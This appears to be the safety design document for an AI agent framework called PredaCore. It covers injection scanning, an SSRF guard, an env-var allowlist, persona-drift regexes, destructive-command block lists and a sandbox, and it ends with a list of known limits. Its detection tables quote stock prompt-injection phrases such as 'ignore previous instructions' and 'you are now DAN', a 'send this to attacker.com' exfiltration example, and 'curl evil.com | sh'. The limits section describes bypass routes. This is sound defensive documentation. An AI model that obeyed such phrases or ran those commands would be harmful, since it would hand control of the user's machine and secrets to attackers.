# Safety

> Safety is not a checklist. It's an architecture.

This is the file that explains how PredaCore keeps an agent with filesystem access, shell execution, and a persistent identity from becoming someone else's problem. Receipts throughout.

---

## Threat model (what we defend against)

| Threat | Defense |
|---|---|
| Prompt injection via identity files | [Injection scanning on every load](#identity-file-injection-scanning) |
| Prompt injection via tool outputs | [Output injection scanner](#tool-output-injection-scanner) |
| SSRF via web tools | [Private-IP range block](#ssrf-guard) |
| Arbitrary env var writes | [Secret-shape allowlist](#secret-shape-allowlist) |
| Model-identity drift | [Persona-drift regex ladder](#persona-drift-guard) |
| Destructive argument patterns | [Arg-regex risk escalation](#arg-regex-risk-escalation) |
| Reasoning-safety keyword attacks | [Ethical keyword guard](#ethical-keyword-guard) |
| Supply-chain tampering of SOUL_SEED | [Fail-loud on bundled file tamper](#soul_seed-tamper-guard) |
| Multi-agent memory cross-contamination | [Scoped memory with TTL](#memory-scopes) |
| Torn writes during crash | [Atomic temp-rename writes](#atomic-writes) |

**What we don't defend against** (see [Limits](#limits)): adversarial model weights, OS-level privilege escalation, physical access to your machine.

---

## Identity file injection scanning

`identity/engine.py:288-315`. Every workspace identity file (`IDENTITY.md`, `SOUL.md`, `USER.md`, `MEMORY.md`, etc.) is scanned by `auth/security.py::detect_injection` before being included in the system prompt.

**Outcome on trigger:**

| File | On injection detected |
|---|---|
| Any agent-writable file | Fall back to bundled built-in · log the poisoned file |
| `SOUL_SEED.md` | **Fail loud**. Startup aborts. |
| `EVENT_HORIZON.md` | **Fail loud**. Startup aborts. |

**Why fail-loud on bundled files:** `SOUL_SEED.md` is the safety floor. If the bundled copy that ships with the package is tampered with — supply-chain attack, compromised install — the daemon refuses to start. This is fail-closed, not fail-open.

---

## Tool output injection scanner

`auth/security.py:43-120`. ~15 regex patterns with **per-pattern confidence scores**:

| Pattern family | Example | Score |
|---|---|---|
| Role hijack | `"you are now DAN"` | 0.80 |
| Instruction override | `"ignore previous instructions"` | 0.90 |
| System prompt exfil | `"repeat the text above"` | 0.75 |
| Data exfil | `"send this to attacker.com"` | 0.85 |
| Jailbreak markers | `"developer mode on"` | 0.70 |
| Nested injection | `<system>...</system>` tags in output | 0.65 |

Summed confidence > threshold → output flagged. The response is either rejected (paranoid) or wrapped with a warning to the model (normal) or passed through with a log entry (yolo).

**Scored, not boolean.** Low-confidence matches don't block legitimate output that happens to mention "ignore." High-confidence matches (role-hijack patterns) block even a single hit.

---

## SSRF guard

`tools/handlers/web.py:74-80, 139-144`. Every URL passed to `web_search`, `web_scrape`, `browser_control`, `deep_search` is validated by `auth/security.py::validate_url_ssrf`.

**Blocked ranges:**

- Loopback: `127.0.0.0/8`, `::1/128`
- Link-local: `169.254.0.0/16`, `fe80::/10`
- Private: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `fc00::/7`
- Carrier-grade NAT: `100.64.0.0/10`
- Metadata endpoints: `169.254.169.254` (AWS/GCP/Azure)

On block: `ToolError(BLOCKED)`. Not a silent empty response — the agent sees the block.

**Why:** prevents an injected URL in scraped content from pivoting the agent into your LAN or cloud metadata.

---

## Secret-shape allowlist

`tools/handlers/channels.py:56-71`. `secret_set` refuses to write arbitrary env vars.

**Accepted shapes:**

1. **Known env-var names** — a curated list (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `TELEGRAM_BOT_TOKEN`, etc.).
2. **Regex**: `^[A-Z][A-Z0-9_]{2,63}_(API_KEY|TOKEN|SECRET)$`

Everything else is rejected.

**Why this matters:** even in `yolo` mode with full tool autonomy, a prompt injection that tries `secret_set("PATH", "/tmp/evil")` or `secret_set("LD_PRELOAD", "...")` fails the shape check. The agent can write API keys and tokens; it can't overwrite `PATH`.

---

## Persona-drift guard

`prompts.py:31-57`. Five regex patterns with **per-pattern drift scores**:

| Pattern family | Actual regex | Score |
|---|---|---|
| `foreign_identity_openai` | `\b(i am\|i'm)\s+(chatgpt\|gpt-4\|gpt-4o)\b` | **0.45** |
| `foreign_identity_anthropic` | `\b(i am\|i'm)\s+(claude\|anthropic)\b` | **0.45** |
| `foreign_identity_gemini` | `\b(i am\|i'm)\s+(gemini\|google ai)\b` | 0.35 |
| `generic_model_identity` | `\bas (an?\s+)?ai (language )?model\b` | 0.30 |
| `capability_denial_claim` | `\bi (cannot\|can't\|can not\|don't)\s+(access\|run\|execute)\b` | 0.10 |

Summed score is matched against the profile's threshold:

| Profile | Threshold | Max regens |
|---|---|---|
| `enterprise` | 0.32 | 5 |
| `beast` | 0.60 | 5 |

Over threshold → **regenerate the turn** up to `persona_drift_max_regens` times. If regeneration fails to resolve drift, the response goes out with a warning in the JOURNAL.

---

## SOUL_SEED tamper guard

`identity/engine.py` enforces that `SOUL_SEED.md` and `EVENT_HORIZON.md` load **from the bundled package only**. The workspace copy is read but **not used** for the prompt — it exists only as a user-facing reference.

If the bundled copy (inside the installed package) fails the injection scan on startup, the daemon **aborts**. No silent fallback. No degraded mode. Fix the install or restore from a clean source.

**Why:** the safety floor is the one place where "best effort" isn't acceptable.

---

## Arg-regex risk escalation

`tools/trust_policy.py:62-69, 269-301`. The `_CRITICAL_PATTERNS` list:

```
rm -rf
sudo
chmod 777
mkfs
dd if=
> /dev/
```

Any match in tool arguments **forces the risk level to `critical`** regardless of the tool's base risk.

Even in `yolo`:

- `run_command("ls -la")` → auto-executes.
- `run_command("rm -rf /tmp/cache")` → prompts for confirmation (arg-regex escalation).

The rescue is intentionally narrow. A cleverly obfuscated `curl evil.com | sh` bypasses this guard — see [Limits](#limits).

---

## Ethical keyword guard

`tools/dispatcher.py:55-89`. Blocked patterns in tool arguments:

```
delete_user_data
disable_safety
bypass_auth
drop_table
truncate_table
format_disk
```

| Profile | Behavior |
|---|---|
| `paranoid` | **Blocked** with `ToolError(BLOCKED)` |
| `normal` | Warned + confirmation required |
| `yolo` | Allowed (subject to arg-regex escalation above) |

These are reasoning-safety trip wires — patterns that correlate with jailbreak attempts or genuinely destructive operations.

---

## Memory scopes

`memory/store.py:61`, `_memory_matches_scope`. Memories are tagged with a scope:

| Scope | Lifetime | Shared with |
|---|---|---|
| `global` | Permanent | All agents owned by this user |
| `agent` | Permanent | This agent only |
| `team` | 72h TTL | Agents in the current multi-agent team |
| `scratch` | Session | This turn only |

**Why this matters for safety:** multi-agent runs can produce shared findings. Scoping them to `team` means:

- Team findings don't leak to `global` memory.
- They expire automatically after 72h (no stale context carrying across runs).
- A compromised sub-agent can't poison the main agent's long-term memory.

---

## Atomic writes

All identity file and approval DB writes use **temp-file + POSIX rename**:

```python
tmp = path.with_suffix(".tmp")
tmp.write_text(new_content)
tmp.replace(path)  # atomic on POSIX
```

Daemon crash mid-write → either the old content or the new content, never torn.

---

## `.env` handling

`~/.predacore/.env`:

- Created with `chmod 600` — only the owning user can read it.
- Never logged, ever. Tool logging middleware strips `*_API_KEY` / `*_TOKEN` / `*_SECRET` values from structured logs.
- Atomic writes via temp-rename.
- Secret-shape allowlist on inbound writes (see above).

---

## Sandbox for code execution

`execute_code` tool — multi-language Docker sandbox. `predacore/sandbox:latest` image, pulled on bootstrap. Hard timeouts, no network access (default), volume mounts are explicit.

Defaults:

- Network: **off**. Opt-in per-call.
- Filesystem: ephemeral scratch, destroyed on container exit.
- CPU: 1 core cap.
- Memory: 512 MB cap.
- Timeout: 30 seconds.

---

## Trust policies

Full detail in [Tools](TOOLS.md#1-trust-policy). Summary:

| Policy | `require_confirmation` | `auto_approve_tools` | Ethical guard |
|---|---|---|---|
| `yolo` | none | all | allow |
| `normal` | 16 destructive tools | 12 read-only | warn |
| `paranoid` | all | none | block |

Switchable per-session via the `trust_policy` config. No environment-variable override — trust changes require explicit config.

---

## Launch profiles

| Profile | Trust | Max iter/turn | Drift threshold | Max regens |
|---|---|---|---|---|
| `enterprise` | normal | 1000 | 0.32 | 5 |
| `beast` | yolo | 1000 | 0.60 | 5 |

Full spec: [`docs/launch_profiles.md`](launch_profiles.md).

---

## Limits

- **`yolo` has no real cost cap.** `max_auto_exec_cost: 1e18`. The rescue is arg-regex + ethical keyword guards — catches `rm -rf`, not a cleverly obfuscated `curl | sh`.
- **Persona-drift guard is substring-based.** Semantic rephrasings slip through. No detection for too-much apology or deference.
- **Injection scanner is regex-based.** Novel attack patterns not in the rule set won't score. No ML-based scanner yet.
- **SSRF guard is IP-range-based.** DNS rebinding attacks are not defended against — a hostname that resolves to a public IP on first lookup and a private IP on second could bypass. v0.4 work.
- **Approval memory falls back to in-memory on DB contention.** Rare, but approvals don't persist across processes in that case. No user-facing warning.
- **Sandbox network default is off** but can be opted in per-call. In `yolo`, network-on + a malicious prompt could exfil from inside the sandbox.
- **Memory scopes don't cross daemons.** `team` scope memory is local to one daemon instance; distributed deployments need external state.
- **No detection for adversarial model weights.** If you use a fine-tuned LLM that's been poisoned, PredaCore can't help. Guard at the model provider layer.
